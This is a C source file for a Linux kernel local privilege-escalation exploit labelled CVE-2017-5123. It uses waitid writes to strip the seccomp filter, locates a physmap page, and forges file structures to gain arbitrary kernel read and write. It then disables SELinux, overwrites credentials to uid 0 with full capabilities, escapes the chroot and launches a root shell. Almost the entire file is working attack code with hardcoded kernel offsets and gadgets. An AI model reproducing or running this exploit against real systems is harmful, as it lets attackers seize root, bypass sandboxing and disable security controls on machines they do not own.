// CVE-2017-5123

#define _GNU_SOURCE
#include <stdlib.h>
#include <errno.h>
#include <wait.h>
#include <string.h>
#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <seccomp.h>
#include <stdlib.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <linux/filter.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <stdarg.h>
#include <sys/mman.h>
#include <sched.h>
#include <pthread.h>
#include <linux/sched.h>
#include <linux/futex.h>
#include <limits.h>
#include <sys/ioctl.h>

#include "pwn.h"
#include "toolset.h"

#define PR_SET_NO_NEW_PRIVS     38
#define __NR_seccomp 317
#define SECCOMP_SET_MODE_FILTER  1

/************ task offsets *************/
// from prctl_get_seccomp
#define OFFSET_OF_SECCOMP_MODE 2920
#define OFFSET_OF_SECCOMP 2928
// from ptrace_access_vm
#define OFFSET_OF_PARENT 2328
// from sys_getcwd 
#define OFFSET_OF_FS 2784
// from __fget_light
#define OFFSET_OF_FILES 2792
// from 
#define OFFSET_OF_NSPROXY 2800
// from do_acct_process
#define OFFSET_OF_SIGNAL 2808
// from sys_getuid 
#define OFFSET_OF_TASK_CRED 2720
// from get_task_comm
#define OFFSET_OF_COMM 2728
// from __put_task_struct
#define OFFSET_OF_TASK_USAGE 72
// from keyctl_session_to_parent
#define OFFSET_OF_THREAD_GROUP 2480


/******* files offsets ********/
// from fput
#define OFFSET_OF_F_COUNT 56
// from free_file_rcu
#define OFFSET_OF_F_CRED 144
// from file_alloc_security 
#define OFFSET_OF_F_SECURITY 192
// 
#define OFFSET_OF_F_INODE 32

/****** inode offsets *********/
#define OFFSET_OF_IFLAGS 12

// should assert nsproxy = files+8
// and fs = files-8
// since that's why we need to fix them up
// nsproxy offsets
#define OFFSET_OF_NS_COUNT 0
// fs offset
#define OFFSET_OF_FS_COUNT 0

// cred offsets
#define CRED_UID_OFF 4
#define CRED_ID_SIZE 32
#define CRED_CAP_OFF 40
#define CRED_CAP_SIZE 40
#define CRED_NS_OFF 136
#define OFFSET_OF_CRED_SECURITY 120


#define FMODE_LSEEK 4

// global offsets
#define KERNEL_BASE_DEFAULT 0xFFFFFFFF81000000
// in cache_seq_next
// mov rax, [rsi]; ret
#define ARB_READ_GADGET_OFF (0xffffffff8109d2b2-KERNEL_BASE_DEFAULT)
// in device_wakeup_attach_irq
// mov [rdx], esi; ret
#define ARB_WRITE_GADGET_OFF (0xffffffff810da932-KERNEL_BASE_DEFAULT)
#define SELINUX_ENFORCING_OFF (0xffffffff824d1394-KERNEL_BASE_DEFAULT)
#define INIT_USER_NS (0xffffffff81e508a0-KERNEL_BASE_DEFAULT)
#define INIT_FS (0xffffffff81f23480-KERNEL_BASE_DEFAULT)

// operations offsets in qwords
#define OFFSET_LSEEK 1
#define OFFSET_IOCTL 9

// a global for the f_op in userspace
unsigned long *f_op;

struct PagePair {
  unsigned long userland_page;
  unsigned long kernel_page;
};

extern unsigned long kernel_base;
void do_exploit_2(unsigned long task_addr);
void get_physmap(struct PagePair *pp);

// global for threads
#define NUM_THREAD_SPRAY 10000
pthread_t g_threads[NUM_THREAD_SPRAY];

// futex wrapper
static int futex(void *uaddr, int futex_op, int val, 
                 const struct timespec *timeout, int *uaddr2, int val3) {
  return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr, val3);
}


/***********EXPLOIT CODE************/

pthread_attr_t thread_attr;

int threads_run;
int barrier2;
int barrier1;
unsigned long g_addr_guess;
unsigned long mapping_begin;
unsigned long mapping_end;

int found_one = 0;
void *thread_guy(void *arg) {
  // this thread continuously checks if the seccomp filter was removed
  // if so we can move onto the part 2 of the exploit
  // we check if the spray worked before and after each barrier
  while (1) {
    
    if (found_one) {
      syscall(SYS_exit, 0);
    }
    // wait on barrier1
    int res = futex(&barrier1, FUTEX_WAIT, 0, NULL, NULL, 0);
    if (found_one) {
      syscall(SYS_exit, 0);
    }
    
    long curr_addr = g_addr_guess;
    __atomic_fetch_add(&threads_run, 1, __ATOMIC_SEQ_CST);
  
    // check if opening /dev/random does not return the error code from seccomp
    // it will still fail because of the chroot, but have a different error
    int fd = open("/dev/random", O_RDONLY);
    if (errno != 1) {
      // FOUND
      printf("found my task at 0x%lx\n", curr_addr);
      found_one = 1;
      do_exploit_2(curr_addr);
      return NULL;
    }
    
    // wait for barrier 2
    if (found_one) {
      syscall(SYS_exit, 0);
    }
    futex(&barrier2, FUTEX_WAIT, 0, NULL, NULL, 0);
    if (found_one) {
      syscall(SYS_exit, 0);
    }
    __atomic_fetch_add(&threads_run, 1, __ATOMIC_SEQ_CST);
  }
}

int num_threads = 0;
long spray_offset;
void unseccomp() {
  // first we spin up a lot of threads
  // let's try 10k
  // and then we try overwriting the TIF_SECCOMP flag in the task struct
  int i;

  unsigned long curr_guess = 0xffff800000000000;
  int j;
  while(1) {
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      mapping_begin = curr_guess;
      printf("found mapping at %p\n", (void*)curr_guess);
      break;
    }
    curr_guess += 0x10000000;
  }
  // check if mapping extends higher?
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno == 14) {
      printf("found mapping end at %p\n", (void*)curr_guess);
      mapping_end = curr_guess;
      curr_guess -= 0x10000000;
      break;
    }
  }
  
  
  // start threads
  barrier1 = 0;
  barrier2 = 0;
  for (i = 0; i < NUM_THREAD_SPRAY; i++) {
    num_threads = i;
    if(pthread_create(&g_threads[i], &thread_attr, thread_guy, NULL)) {
      printf("pthread create error\n");
      printf("%d\n", i);
      break;
    }
  }
  printf("%d threads created\n", num_threads);
  
  /***** find the kernel heap *******/
  unsigned long last_mapping_start;
  unsigned long last_mapping_end;
  
  unsigned long second_mapping;
  unsigned long second_mapping_end;
  usleep(100000);
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found second mapping at %p\n", (void*)curr_guess);
      //mapping_end = curr_guess;
      second_mapping = curr_guess;
      last_mapping_start = second_mapping;
      curr_guess -= 0x10000000;
      break;
    }
  }
  while(1) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno == 14) {
      printf("found second mapping end at %p\n", (void*)curr_guess);
      second_mapping_end = curr_guess;
      last_mapping_end = second_mapping_end;
      curr_guess -= 0x10000000;
      break;
    }
  }


  unsigned long third_mapping = 0;
  unsigned long third_mapping_end;
  usleep(100000);
  while(curr_guess < second_mapping_end+0x100000000) {
    curr_guess += 0x10000000;
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found third mapping at %p\n", (void*)curr_guess);
      third_mapping = curr_guess;
      last_mapping_start = third_mapping;
      curr_guess -= 0x10000000;
      break;
    }
  }
  if (third_mapping) {
    while(1) {
      curr_guess += 0x10000000;
      // try writing
      int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
      if (errno == 14) {
        printf("found third mapping end at %p\n", (void*)curr_guess);
        third_mapping_end = curr_guess;
        last_mapping_end = third_mapping_end;
        curr_guess -= 0x10000000;
        break;
      }
    }
  }
  /***** done finding the kernel heap *******/
  
  /****** start overwriting from low addresses to high and hope we unset the seccomp flag ******/
  // some start guess found by experimenting, could be very wrong on some systems
  curr_guess = last_mapping_end-0x100000000;
  printf("last_mapping is 0x%lx bytes\n", last_mapping_end-last_mapping_start);
  printf("min guess %lx\n", curr_guess);
  printf("starting guessing\n");
  printf("this part can take up to a minute, or crash the machine :)\n");
  i = 0;
  while(!found_one) {
    curr_guess += 0x800000;
    unsigned long guess_val = curr_guess + spray_offset;
    // try writing
    syscall(SYS_waitid, P_ALL, 0, guess_val-26, WEXITED, NULL);
    g_addr_guess = guess_val;
    // let the threads check
    barrier2 = 0;
    threads_run = 0;
    barrier1 = 1;
    futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    while(threads_run < num_threads) {
      if (found_one) {
        // one of the threads is free from seccomp
        // wake from barriers first
        barrier1=1;
        barrier2=1;
        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        printf("joining threads\n");
        for(i = 0; i < num_threads; i++) {
          pthread_join(g_threads[i], NULL);
        }
        printf("done joining threads\n");        
        
        sleep(1000);
      }
      usleep(10000);
    }
    
    // make sure threads are reset
    barrier2 = 1;
    barrier1 = 0;
    futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
    while(threads_run < num_threads*2) {
      if (found_one) {
        printf("apparently we found one sleep forever\n");
        // wake from barriers first
        barrier1=1;
        barrier2=1;
        futex(&barrier1, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        futex(&barrier2, FUTEX_WAKE, INT_MAX, NULL, NULL, 0);
        printf("joining threads\n");
        for(i = 0; i < num_threads; i++) {
          pthread_join(g_threads[i], NULL);
        }
        printf("done joining threads\n");    
        sleep(100000);
      }
      usleep(10000);
    }
    threads_run = 0;
    barrier2 = 0;
    i += 1;  
  }
}

int just_exit(void *arg) {
  return 0;
}

int done_overwrite;
long new_stack[10000];
void write_5(unsigned long addr, unsigned long val) {
  // uses waitid with pid to write a 5 byte value
  // clobbers a lot of adjacent memory, mostly with 0's
  long fake_info[20];
  
  if(val & 0xffffff) {
    printf("cannot write that val\n");
    exit(-1);
  }
  
  //fork exit until pid is good
  int i = 0;
  for(i = 3; i < 8; i++) {
    int to_write = (val >> (8*i)) & 0xff;
    while(1) {
      // get pid ending in to_write
      //int pid = fork();
      // to make super fast we clone VM instead of regular fork
      // int pid = syscall(SYS_clone, CLONE_VM | CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD, &new_stack[200], NULL, 0, 0);
      int pid = clone(just_exit, &new_stack[5000], CLONE_VM | SIGCHLD, NULL);
      if (!pid) {
        exit(0);
      }
      if ((pid & 0xff) == to_write) {
        syscall(SYS_waitid, P_PID, pid, addr-16+i, WEXITED, NULL);
        break;
      }
      else {
        syscall(SYS_waitid, P_PID, pid, fake_info, WEXITED, NULL);
      }
    }
  }
  
}

// functions for once we control ops
unsigned long read_addr(unsigned long addr) {
  f_op[OFFSET_LSEEK] = ARB_READ_GADGET_OFF + kernel_base;
  return syscall(SYS_lseek, 0, addr, SEEK_SET);
}

void mem_read(unsigned long addr, void *buf, unsigned long bytes) {
  unsigned long i = 0;
  char *cbuf = (char*)buf;
  for(i = 0; i < bytes; i+= 8) {
    unsigned long got = read_addr(addr+i);
    if (i+8 > bytes) {
      unsigned long j = 0;
      for(j = i; j < bytes; j++) {
        cbuf[j] = (char)got&0xff;
        got >>= 8;
      }
    }
    else {
      *(long*)(cbuf+i) = got;
    }
  }
}

void write_addr4(unsigned long addr, unsigned int val) {
  f_op[OFFSET_IOCTL] = ARB_WRITE_GADGET_OFF+kernel_base;
  ioctl(0, val, addr);
}

void write_addr(unsigned long addr, unsigned long val) {
  write_addr4(addr, (unsigned int)val);
  write_addr4(addr+4, (unsigned int)(val>>32));  
}

void mem_write(unsigned long addr, void *buf, unsigned long bytes) {
  if (bytes < 4 || bytes % 4 != 0) {
    //cannot write less than 4 bytes
    printf("Invalid write size\n");
    exit(-1);
  }
  int i = 0;
  char *cbuf = buf;
  for(i = 0; i < bytes; i+=4) {
    write_addr4(addr+i, *(unsigned int*)(cbuf+i));
  }
}


void *write_5_thread(void *arg) {
  // constantly write to pages to keep them dirtly and "mlock" them
  unsigned long *aa = arg;
  unsigned long addr = aa[0];
  unsigned long data = aa[1];
  write_5(addr, data);
  done_overwrite = 1;
}

int done_rooting;
void *thread_to_be_root(void *arg) {
  // this guy exists for copying data and becoming root
  while(!done_rooting) {
    usleep(10000);
  }
  printf("trying to call system...\n");
  system("/bin/sh");
}

void do_exploit_2(unsigned long task_addr) {
  // second part of the exploit
  // now that we don't have seccomp we can fork and use waitid to write up to 5 non-NULL bytes
  // I map a large section of memory and search for it in the physmap to find an address with 3 NULL bytes
  // The physmap allows us to control data from userland and bypass smap

  // sleep for a bit to make sure threads exit
  usleep(100000);

  // remove seccomp filter
  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP-4, WEXITED, NULL);  
  syscall(SYS_waitid, P_ALL, 0, task_addr + OFFSET_OF_SECCOMP_MODE, WEXITED, NULL);
  // verify seccomp removed for child
  int pid = fork();
  int rand_fd = open("/dev/random", O_RDONLY); // this will fail due to chroot
  
  if (errno == 1) {
    printf("SECCOMP NOT ACTUALLY GONE!\n");
    exit(-1);
  }
  if (!pid) {
    exit(0);
  }
  
  printf("part 2 start\n");
  // First, get a physmap address in the kernel land
  struct PagePair pp;
  get_physmap(&pp);
  
  // now we have a physmap address that we know, we can create our fake files
  // we will set up fake files struct
  memset((void*)pp.userland_page, 0x41, 0x1000);
  unsigned long files_struct = pp.userland_page;
  *(int*)files_struct = 100; // count (make sure it's never freed)
  *(unsigned long*)(files_struct+32) = pp.kernel_page+0x100; // fdt
  
  // set up fdt
  unsigned long fdt = pp.userland_page+0x100;
  *(int*)fdt = 2; // num_files
  *(unsigned long*)(fdt+8) = pp.kernel_page+0x200; // fd[] 
  
  // set up fd[]
  unsigned long fdarr = pp.userland_page+0x200;
  *(unsigned long*)fdarr = pp.kernel_page+0x300; // fd[0]
  
  // set up file struct
  unsigned long file = pp.userland_page+0x300;
  *(unsigned long*)(file+40) = pp.kernel_page+0x400; // f_op
  *(unsigned int*)(file+68) = FMODE_LSEEK; // mode
  *(unsigned long*)(file+OFFSET_OF_F_COUNT)=100; // never free me

  f_op = (unsigned long*)(pp.userland_page+0x400); // f_op pointer

  // need to set up IS_PRIVATE(inode)) and file->cred = task->cred to pass checks for ioctl
  // this is the IS_PRIVATE(inode)
  *(unsigned long*)(file+OFFSET_OF_F_INODE)=pp.kernel_page+0x500; // inode
  unsigned long inode = (unsigned long)(pp.userland_page+0x500); // inode
  *(unsigned int*)(inode+OFFSET_OF_IFLAGS) = 0x200; // IS_PRIVATE
  
  // write over files pointer in task struct
  // will overwrite signal nsproxy and fs, so we will need to fix it
  printf("here we go\n");
  done_overwrite=0;
  long aa[2];
  aa[0] = task_addr + OFFSET_OF_FILES;
  aa[1] = pp.kernel_page;
  pthread_t th1;
  // create the thread we will make root
  done_rooting = 0;
  if(pthread_create(&th1, NULL, thread_to_be_root, NULL)) {
    printf("pthread failed\n");
    exit(-1);
  }
  
  // create a thread to overwrite the files in our task
  // this current thread can't do that because the signal will be corrupted
  if(pthread_create(&th1, NULL, write_5_thread, aa)) {
    printf("pthread failed\n");
    exit(-1);
  }

  // wait for the thread to overwrite my files
  while(!done_overwrite) {
  }
   
  // I'll use lseek here to do arbitrary reads

  // need to set up IS_PRIVATE(inode)) and file->security = task->cred->security to pass checks for ioctl  
  // first fix up structures in FILE
  // let's check another file
  // leak out addr of parent
  unsigned long parent_addr = read_addr(task_addr+OFFSET_OF_PARENT);
  
  // grab security from task cred
  unsigned long cred = read_addr(task_addr + OFFSET_OF_TASK_CRED);
  unsigned long security = read_addr(cred + OFFSET_OF_CRED_SECURITY);
  
  // fix up file->security
  *(unsigned long*)(file+OFFSET_OF_F_SECURITY) = security;

  // now have arb write through ioctl!
    
  // okay first fix up task struct
  // copy parent's nsproxy and set it's refcount high
  long parent_nsproxy = read_addr(parent_addr+OFFSET_OF_NSPROXY);
  write_addr(task_addr+OFFSET_OF_NSPROXY, parent_nsproxy);
  write_addr4(parent_nsproxy+OFFSET_OF_NS_COUNT, 0x11111111);
  
  // copy parent's fs and set it's refcount high
  long parent_fs = read_addr(parent_addr+OFFSET_OF_FS);
  write_addr(task_addr+OFFSET_OF_FS, parent_fs);
  write_addr4(parent_fs+OFFSET_OF_FS_COUNT, 0x11111111);
  
  // now set tasks refcount high, we don't want to free it ever either?
  write_addr4(task_addr+OFFSET_OF_TASK_USAGE, 0x11111);
  
  // GET ROOT
  // disable selinux enforcing
  write_addr4(kernel_base+SELINUX_ENFORCING_OFF, 0);
  
  unsigned long thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP)-OFFSET_OF_THREAD_GROUP;
  if (thread2 == task_addr) {
    thread2 = read_addr(task_addr+OFFSET_OF_THREAD_GROUP+8)-OFFSET_OF_THREAD_GROUP;
  }

  unsigned long signal = read_addr(thread2+OFFSET_OF_SIGNAL);
  write_addr(task_addr+OFFSET_OF_SIGNAL, signal);
  // should be able to ptrace now (it's a decent test to make sure signal is fixed
  
  // now fix up cred we want root
  char buf[100];
  memset(buf, 0, sizeof(buf));
  mem_write(cred+CRED_UID_OFF, buf, CRED_ID_SIZE);
  memset(buf, 0xff, sizeof(buf));
  mem_write(cred+CRED_CAP_OFF, buf, CRED_CAP_SIZE);
  unsigned long init_ns = INIT_USER_NS+kernel_base;
  mem_write(cred+CRED_NS_OFF, &init_ns, 8); // is this okay

  // now we need to just escape the file system sandbox (chroot)
  unsigned long init_fs = INIT_FS+kernel_base;
  write_addr(thread2+OFFSET_OF_FS, init_fs);
  // WE ARE DONE!
  // signal to the other thread and sleep forever
  done_rooting = 1;
  sleep(1000000);

}

/***** physmap code ******/
int done_locking;
char *mapping_base;
void *mlock_thread(void *arg) {
  // constantly write to pages to keep them dirtly and "mlock" them
  long i;
  char last_val = 0;
  while(!done_locking) {
    last_val += 1;
    for(i = 0xfff; i < 0x10000000; i+= 0x1000) {
      mapping_base[i] = last_val;
    }
  }
}

void* mapping_changed() {
  long i = 0;
  for(i = 0; i < 0x10000000; i+= 0x1000) {
    if (mapping_base[i] != 0x41) {
      printf("%lx changed to %d\n", i, mapping_base[i]);
      // lock that page in
      if(mlock(&mapping_base[i], 0x1000)) {
        perror("mlock");
      }
      printf("page locked!\n");
      return &mapping_base[i];
    }
  }
  return 0;
}

void get_physmap(struct PagePair *pp) {
  // mmap a large amount of memory
  // have one thread watch for changes, while we try overwriting it in the kernel's physmap
  // lock the page in when it's found
  unsigned long base = 0x100000000;
  mapping_base = (char*)base;
  
  long* a = mmap((void*)base, 0x10000000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_FIXED | MAP_ANONYMOUS, -1, 0);
  if ((long)a == -1) {
    printf("mmap failed\n");
    perror("mmap");
    exit(-1);
  }
  printf("mapped %p\n", a);
  memset(a, 0x41, 0x10000000);

  done_locking = 0;
  int j = 0;
  for(j = 0; j < 4; j++) {
    pthread_t th1;
    if(pthread_create(&th1, NULL, mlock_thread, NULL)) {
      printf("mlock thread create error\n");
      exit(0);
    }
  }

  // try to find it in physmap
  unsigned long curr_guess = mapping_begin-0x80000000;
  printf("trying to find physmap mapping\n");
  while(1) {
    // try writing
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess+0xfe0, WEXITED, NULL);
    if (errno != 14) {
      printf("found mapping at %p\n", (void*)curr_guess);
      curr_guess += 0x80000000;
      break;
    }
    curr_guess += 0x10000000;
  }
  // try to find physmap
  long *locked_mapping = NULL;
  long *locked_kernel_mapping = NULL;
  while(1) {
    // this has 6 0's to ensure that we end up with an address containing only 5 non-zero vals
    curr_guess += 0x1000000;
    int res = syscall(SYS_waitid, P_ALL, 0, curr_guess, WEXITED, NULL);
    if (locked_mapping = mapping_changed()) {
      locked_kernel_mapping = (long*)curr_guess;
      printf("detected change at %p\n", (void*)curr_guess);
      break;
    }
  }
  
  // verify lock worked
  locked_mapping[0] = 0x41414141;
  syscall(SYS_waitid, P_ALL, 0, locked_kernel_mapping, WEXITED, NULL);
  syscall(SYS_waitid, P_ALL, 0, &locked_kernel_mapping[100], WEXITED, NULL);
  if (locked_mapping[0] != 0 || locked_mapping[100] != 0) {
    printf("second write didn't work...");
  }
  printf("physmap addr is good\n");
  if(pp) {
    pp->userland_page = (unsigned long)locked_mapping;
    pp->kernel_page = (unsigned long)locked_kernel_mapping;
  }
  done_locking = 1;

}

int main() {

  setvbuf(stdout, NULL, _IONBF, 0);
  srand(time(NULL));

#if(ENABLE_KASLR_BYPASS == 1)
  unsigned long base = get_kernel_base();
  if (base == -1) {
    return -1;
  }
#else
  kernel_base = KERNEL_BASE_DEFAULT;
#endif

  // unseccomp();
  return 0;
}